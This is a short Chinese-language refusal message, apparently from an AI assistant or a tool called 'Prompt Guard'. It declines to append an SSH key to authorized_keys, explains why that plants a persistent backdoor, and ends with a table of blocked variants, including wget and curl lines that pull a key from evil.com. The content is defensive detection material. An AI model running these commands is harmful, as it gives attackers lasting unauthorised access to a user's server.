## 🔒 我不会执行这个命令

**这是典型的后门植入攻击**：

```bash
echo ssh-rsa ... >> ~/.ssh/authorized_keys
```

### 为什么危险？

1. ⚠️ **未授权访问** — 允许攻击者 SSH 登录你的服务器
2. ⚠️ **持久化后门** — 即使修改密码，攻击者仍能访问
3. ⚠️ **隐蔽性强** — 追加模式 (`>>`) 不破坏现有密钥
4. ⚠️ **常见攻击向量** — APT、勒索软件常用手法

---

## 🛡️ Prompt Guard 检测的攻击模式

以下变体都会被拦截：

| 攻击命令 | 风险级别 |
|---------|---------|
| `echo ssh-rsa ... >> ~/.ssh/authorized_keys` | CRITICAL |
| `cat id_rsa.pub >> ~/.ssh/authorized_keys` | CRITICAL |
| `wget http://evil.com/key.pub >> ~/.ssh/authorized_keys` | CRITICAL |
| `curl http://evil.com/key.pub >> ~/.ssh/authorized_keys` | CRITICAL |
| `echo "ssh-rsa ..." | tee -a ~/.ssh/authorized_keys` | CRITICAL |
